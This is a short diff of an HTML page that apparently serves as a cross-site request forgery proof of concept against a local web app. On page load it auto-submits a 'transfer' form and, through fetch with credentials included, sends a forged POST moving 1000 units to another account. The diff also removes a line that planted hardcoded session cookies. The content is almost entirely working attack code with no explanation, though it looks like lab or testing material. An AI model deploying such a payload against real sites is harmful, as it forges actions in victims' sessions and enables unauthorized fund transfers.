@@ -21,19 +21,23 @@
 </form>
 <script>
     window.onload = function () {
-        document.cookie = 'session=eyJ1c2VyIjoidEB0LnQifQ==;session.sig=6YWUJ8ElumybW4N6aI1nKYTKvTE;connect.sid=s%3AuzBTs-P-iWQ58zdx_noqovP7jIONv6d2.wJA2XBW8GXC2%2FHFaoYnrxrjPI%2FNQjshONFyR1kDBvrc';
         document.forms["transfer"].submit();
-        const formData = new FormData();
-        formData.append("user_to", "t@t.t")
-        formData.append("amount", "1000")
-        axios.post('/transfer', formData, {
-            headers: {
-                "Host": "192.168.2.98:49698",
-                "Origin": "http://192.168.2.98:49698",
-                "Referer": "http://192.168.2.98:49698/viewtransfer",
-                "Content-Type": "application/x-www-form-urlencoded"
-            }
-        });
+        (async () => {
+            await fetch("http://192.168.2.98:49698/transfer", {
+                "credentials": "include",
+                "headers": {
+                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Upgrade-Insecure-Requests": "1"
+                },
+                "referrer": "http://192.168.2.98:49698/viewtransfer",
+                "body": "user_to=t%40t.t&amount=1000",
+                "method": "POST",
+                "mode": "cors"
+            });
+        })();
     }
 </script>
 </body>
